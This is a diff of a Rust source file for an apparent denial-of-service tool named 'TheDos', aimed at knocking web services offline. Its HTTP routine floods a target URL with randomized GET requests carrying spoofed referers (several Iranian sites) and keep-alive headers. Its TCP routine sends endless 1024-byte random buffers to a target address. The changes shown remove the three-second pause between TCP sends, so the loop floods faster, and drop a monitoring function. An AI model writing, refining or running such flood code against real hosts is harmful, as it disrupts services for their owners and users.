@@ -27,28 +27,28 @@ use crate::*;
 pub struct TheDos{
     pub flag: u8,
     pub safe: u8,
-    pub host: String,
-    pub url: String,
-    pub tcp_addr: Option<String>,
-    pub udp_addr: Option<String>,
     pub retries: u128,
     pub status_code: u16,
+    pub host: Option<String>,
+    pub url: Option<String>,
+    pub tcp_addr: Option<String>,
+    pub udp_addr: Option<String>,
 }
 
 
 impl TheDos{
 
 
-    pub fn new(url: &str, tcp_addr: Option<String>, udp_addr: Option<String>, host: &str) -> Self{
+    pub fn new(url: Option<String>, tcp_addr: Option<String>, udp_addr: Option<String>, host: Option<String>) -> Self{
         Self{
             flag: 0,
             safe: 0,
-            host: host.to_string(),
-            url: url.to_string(),
-            tcp_addr,
-            udp_addr,
             retries: 0,
             status_code: 0,
+            host,
+            url,
+            tcp_addr,
+            udp_addr,
         }
     }
 
@@ -92,28 +92,13 @@ impl TheDos{
     
     }
 
-    pub fn monitor_attack(&self){
-        info!("monitoring the attack");
-        let mut last_try = self.retries;
-        while self.flag == 0{
-            if last_try + 100 < self.retries && last_try != self.retries{
-                info!("request sent {}", self.retries);
-                last_try = self.retries;
-            }
-            if self.flag == 2{
-                info!("-- TheDos Attack Finished --");
-                process::exit(1);
-            }
-        }
-    }
-
     
     pub fn headers_referers(&self) -> Vec<&str>{ // it's ok to return Vec<&str> since we're using the lifetime of the self
         let mut headers_referers = Vec::<&str>::new();
         headers_referers.push("http://snappfood.ir/");
         headers_referers.push("http://digikala.com/");
         headers_referers.push("http://arvancloud.com/");
-        headers_referers.push(self.host.as_str());
+        headers_referers.push(self.host.as_ref().unwrap().as_str());
 
         headers_referers
 
@@ -122,14 +107,14 @@ impl TheDos{
     
     pub async fn httpcall(&mut self){ // url is &str thus we don't need to clone it since its sized
         
-        let param_joiner = if self.url.as_str().matches("&").count() > 0{
+        let param_joiner = if self.url.as_ref().unwrap().as_str().matches("&").count() > 0{ // can't move self.url since it's behind a mutable reference thus we have to borrow it using as_ref() method
             "&"
         } else{
             "?"
         };
         
         let referer = format!("{}{}", self.headers_referers()[gen_random_number(0, self.headers_referers().len() as u32 ) as usize], gen_chars(gen_random_number(5, 11)));
-        let uri = format!("{}{}{}={}", self.url.as_str(), param_joiner, gen_chars(gen_random_number(3, 11)), gen_chars(gen_random_number(3, 11))).as_str().parse::<Uri>().unwrap();
+        let uri = format!("{}{}{}={}", self.url.as_ref().unwrap().as_str(), param_joiner, gen_chars(gen_random_number(3, 11)), gen_chars(gen_random_number(3, 11))).as_str().parse::<Uri>().unwrap();
         let client = Client::new();
         let req = Request::builder()
                                             .uri(&uri)
@@ -140,7 +125,7 @@ impl TheDos{
                                             .header("Referer", referer.as_str())
                                             .header("Keep-Alive", gen_random_number(110, 120))
                                             .header("Connection", "keep-alive")
-                                            .header("Host", self.host.as_str())
+                                            .header("Host", self.host.as_ref().unwrap().as_str())
                                             .body(Body::from(""))
                                             .expect("failed to build the request");
 
@@ -156,17 +141,20 @@ impl TheDos{
         // we don't need to be sequential thus we must have joinhanle tasks: https://www.fpcomplete.com/blog/http-status-codes-async-rust/
         // let res = block_on(client.request(req)).unwrap(); 
         
-        info!("sending GET of {} to {}", uri, self.url);
-        let res = client.request(req).await;
+        info!("sending GET of {} to {} for {} times", uri, self.url.as_ref().unwrap(), self.retries);
+        
+        // first it'll create a hyper request process object during the loop and run the rest of the code without blocking 
+        // then await on each of them asyncly to send those created request object to the target host  
+        // finally it'll check the response comming back from the target for each result.
+        let res = client.request(req).await; 
 
+        
         if let Err(e) = res{
-            error!("can't send to {} due to {}", self.url, e);
+            error!("can't send to {} due to {}", self.url.as_ref().unwrap(), e);
             process::exit(1);
         } else {
             
             let res = res.unwrap();
-            self.monitor_attack(); // Let Me Cry For You 
-        
             if res.status() == 500{
                 self.flag = 1;
                 self.status_code = 500;
@@ -176,16 +164,12 @@ impl TheDos{
             }
                 
         }
-
-
-        
     
     }
     
     
     pub async fn tcpcall(&mut self){
 
-        let sleep = Duration::from_secs("3".to_string().parse::<u64>().unwrap());
         let mut time = self.retries;
     
         loop{
@@ -198,7 +182,7 @@ impl TheDos{
     
                         info!("sending packet {}", time);
                         let random_bytes: Vec<u8> = (0..1024).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with size 1024 bytes
-                        stream.write_all(&random_bytes).await.unwrap();
+                        stream.write_all(&random_bytes).await.unwrap(); // sending buffer to the target host 
     
                     },
                     Err(e) => {
@@ -206,10 +190,6 @@ impl TheDos{
                     }
                 }
             });  
-
-            self.monitor_attack(); // Let Me Cry For You 
-
-            thread::sleep(sleep);
 
             self.retries = time;
         }
